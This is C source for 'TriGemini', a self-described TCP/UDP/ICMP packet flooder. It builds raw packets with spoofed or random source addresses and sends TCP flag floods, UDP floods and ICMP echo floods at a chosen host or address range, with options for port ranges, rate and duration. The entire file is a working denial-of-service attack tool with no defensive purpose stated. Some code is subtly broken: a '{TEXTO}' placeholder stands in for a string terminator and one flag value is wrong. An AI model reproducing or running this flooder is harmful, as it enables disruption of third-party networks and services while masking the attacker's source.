/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#ifdef F_PASS
#include <sys/stat.h>
#endif
#include <netinet/in_systm.h>                                                  
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#ifndef __USE_BSD
#   define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#   define __FAVOR_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#ifdef LINUX
#   define FIX(x)  htons(x)
#else
#   define FIX(x)  (x)
#endif
#define TCP_ACK         1
#define TCP_FIN         2
#define TCP_SYN         4
#define TCP_RST         8
#define UDP_CFF         16
#define ICMP_ECHO_G     32
#define TCP_NOF         64 
#define TCP_URG         128
#define TCP_PSH			258
#define TCP_ECE			512
#define TCP_CWR			1024

#define TH_NOF         0x0
        #define TH_ECE  0x40
        #define TH_CWR  0x80
#define TCP_ATTACK()    (a_flags & TCP_ACK ||\
                         a_flags & TCP_FIN ||\
                         a_flags & TCP_SYN ||\
                         a_flags & TCP_RST ||\
                         a_flags & TCP_NOF ||\
                        a_flags & TCP_PSH ||\
                        a_flags & TCP_ECE ||\
                        a_flags & TCP_CWR ||\
                         a_flags & TCP_URG )
#define UDP_ATTACK()    (a_flags & UDP_CFF)
#define ICMP_ATTACK()   (a_flags & ICMP_ECHO_G)
#define CHOOSE_DST_PORT() dst_sp == 0 ?\
                          random ()   :\
                          htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
#define CHOOSE_SRC_PORT() src_sp == 0 ?\
                          random ()   :\
                          htons(src_sp + (random() % (src_ep -src_sp +1)));
#define SEND_PACKET()   if (sendto(rawsock,\
                                   &packet,\
                                   (sizeof packet),\
                                   0,\
                                   (struct sockaddr *)&target,\
                                    sizeof target) < 0) {\
                                        perror("sendto");\
                                        exit(-1);\
                        }
#define BANNER_CKSUM 54018
//#define BANNER_CKSUM 723
u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);                        
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);
u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;
struct pseudo_hdr {         
    u_long saddr, daddr;    
    u_char mbz, ptcl;       
    u_short tcpl;           
};
struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};
struct {
    int gv; 
    int kv;
    void (*f)(u_char);
} a_list[] = {
    { TCP_ACK, TH_ACK, send_tcp },
    { TCP_FIN, TH_FIN, send_tcp },
    { TCP_SYN, TH_SYN, send_tcp },
    { TCP_RST, TH_RST, send_tcp },
    { TCP_NOF, TH_NOF, send_tcp },
    { TCP_URG, TH_URG, send_tcp },
    { TCP_PSH, TH_PUSH, send_tcp },
    { TCP_ECE, TH_ECE, send_tcp },
    { TCP_CWR, TH_CWR, send_tcp },
    { UDP_CFF, 0, send_udp },
    { ICMP_ECHO_G, ICMP_ECHO, send_icmp },
    { 0, 0, (void *)NULL },
};
int
main(int argc, char *argv[])
{
    int n, i, on = 1;
    int b_link;
#ifdef F_PASS
    struct stat sb;
#endif
    unsigned int until;
    a_flags = dstaddr = i = 0;
    dst_sp = dst_ep = src_sp = src_ep = 0;
    until = b_link = -1;
    src_class = dst_class = NULL;
    while ( (n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1) {
        char *p;
        switch (n) {
            case 'T':
                switch (atoi(optarg)) {
                    case 0: a_flags |= TCP_ACK; break;
                    case 1: a_flags |= TCP_FIN; break;
                    case 2: a_flags |= TCP_RST; break;
                    case 3: a_flags |= TCP_SYN; break;
                    case 4: a_flags |= TCP_URG; break;
                    case 5: a_flags |= TCP_PSH; break;
                    case 6: a_flags |= TCP_ECE; break;
                    case 7: a_flags |= TCP_CWR; break;
                }
                break;
            case 'U':
                a_flags |= UDP_CFF;
                break;
            case 'I': 
                a_flags |= ICMP_ECHO_G;
                break;
            case 'N': 
                a_flags |= TCP_NOF;
                break;
            case 's':
                src_class = optarg;
                break;
            case 'h':
                dstaddr = lookup(optarg);    
                break;
            case 'd':
                dst_class = optarg;
                i = 1; 
                break;
            case 'p':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                dst_sp = atoi(optarg); 
                dst_ep = atoi(p +1);  
                break;
            case 'q':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                src_sp = atoi(optarg); 
                src_ep = atoi(p +1); 
                break;
            case 'l':
                b_link = atoi(optarg);
                if (b_link <= 0 || b_link > 100)
                    usage(argv[0]);
                break;
            case 't':
                until = time(0) +atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }
    if ( (!dstaddr && !i) ||
         (dstaddr && i) ||
         (!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
         (src_sp != 0 && src_sp > src_ep) ||
         (dst_sp != 0 && dst_sp > dst_ep))
            usage(argv[0]);
    srandom(time(NULL) ^ getpid());
    if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket");
        exit(-1);
    }
    if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
        (char *)&on, sizeof(on)) < 0) {
            perror("setsockopt");
            exit(-1);
    }
    target.sin_family           = AF_INET;
    for (n = 0; ; ) {
        if (b_link != -1 && random() % 100 +1 > b_link) {
            if (random() % 200 +1 > 199)
                usleep(1);
            continue;
        }
        for (i = 0; a_list[i].f != NULL; ++i) {
            if (a_list[i].gv & a_flags)
                a_list[i].f(a_list[i].kv);
        }        
        if (n++ == 100) {
            if (until != -1 && time(0) >= until) break;
            n = 0;
        }
    }          
    exit(0);
}
u_long
lookup(const char *host)
{
    struct hostent *hp;
  
    if ( (hp = gethostbyname(host)) == NULL) {
        perror("gethostbyname");
        exit(-1);
    }
    return *(u_long *)hp->h_addr;
}
#define RANDOM() (int) random() % 255 +1
char *
class2ip(const char *class)
{
    static char ip[16];
    int i, j;
  
    for (i = 0, j = 0; class[i] != '{TEXTO}'; ++i)
        if (class[i] == '.')
            ++j;
    switch (j) {
        case 0:
            sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
            break;
        case 1:
            sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
            break;
        case 2:
            sprintf(ip, "%s.%d", class, RANDOM());
            break;
        default: strncpy(ip, class, 16);
                 break;
    }
    return ip;
}
unsigned short
in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *)w;
        sum += answer;
    }
    sum    = (sum >> 16) + (sum & 0xffff);  
    sum   += (sum >> 16);                   
    answer = ~sum;                         
    return answer;
}
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
{
    ip->ip_hl             = 5;
    ip->ip_v              = 4;
    ip->ip_p              = p;
    ip->ip_tos            = 0x08;
    ip->ip_id             = random();
    ip->ip_len            = len;
    ip->ip_off            = 0;
    ip->ip_ttl            = 255;
    ip->ip_dst.s_addr     = dst_class != NULL ?
                            inet_addr(class2ip(dst_class)) :
                            dstaddr; 
    ip->ip_src.s_addr     = src_class != NULL ?
                            inet_addr(class2ip(src_class)) :
                            random();
    target.sin_addr.s_addr = ip->ip_dst.s_addr;
}    
static void
send_tcp(u_char th_flags)
{
    struct cksum cksum;
    struct packet {
       struct ip ip;
        struct tcphdr tcp;
    } packet;
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
    packet.ip.ip_sum        = in_cksum((void *)&packet.ip, 20);
    cksum.pseudo.daddr      = dstaddr;
    cksum.pseudo.mbz        = 0;
    cksum.pseudo.ptcl       = IPPROTO_TCP;
    cksum.pseudo.tcpl       = htons(sizeof(struct tcphdr));
    cksum.pseudo.saddr      = packet.ip.ip_src.s_addr;
    packet.tcp.th_win       = random();
    packet.tcp.th_seq       = random();
    packet.tcp.th_ack       = random();
    packet.tcp.th_flags     = th_flags;
    packet.tcp.th_off       = 5;
    packet.tcp.th_urp       = 0;
    packet.tcp.th_sport     = CHOOSE_SRC_PORT();
    packet.tcp.th_dport     = CHOOSE_DST_PORT();
    cksum.tcp               = packet.tcp;
    packet.tcp.th_sum       = in_cksum((void *)&cksum, sizeof(cksum));
    SEND_PACKET();
}
static void
send_udp(u_char garbage) 
{                      
    struct packet {
        struct ip ip;
        struct udphdr udp;
    } packet;
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);
    packet.udp.uh_sport         = CHOOSE_SRC_PORT();
    packet.udp.uh_dport         = CHOOSE_DST_PORT();
    packet.udp.uh_ulen          = htons(sizeof packet.udp);
    packet.udp.uh_sum           = 0; 
    SEND_PACKET();
}
static void
send_icmp(u_char gargabe) 
{
    struct packet {
        struct ip ip;
        struct icmp icmp;
    } packet;
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);
    packet.icmp.icmp_type       = ICMP_ECHO;
    packet.icmp.icmp_code       = 0;
    packet.icmp.icmp_cksum      = htons( ~(ICMP_ECHO << 8));
    SEND_PACKET();
} 
const char *banner = "TriGemini. [TCP/UDP/ICMP Packet flooder]";
static void
usage(const char *argv0)
{
	printf("%s \n", banner);
        printf("    -U UDP   attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
        printf("    -I ICMP  attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
        printf("    -N Bogus attack                         \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
	printf("    -T TCP   attack                     \e[1;37m[\e[0m0:ACK   1: FIN\e[1;37m]\e[0m\n");
	printf("                                        \e[1;37m[\e[0m2:RST   3: SYN\e[1;37m]\e[0m\n");		
	printf("                                        \e[1;37m[\e[0m4:URG   5:PUSH\e[1;37m]\e[0m\n");
	printf("                                        \e[1;37m[\e[0m6:ECE   7: CWR\e[1;37m]\e[0m\n");	
        printf("    -h target host/ip                       \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
        printf("    -d destination class                        \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -s source class/ip                          \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -p destination port range [start,end]       \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -q source port range      [start,end]       \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -l pps limiter                            \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n");
        printf("    -t timeout                              \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
    printf("\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -T5 -T6 -T7 -U -I] -h -t\n", argv0);
    exit(-1);
}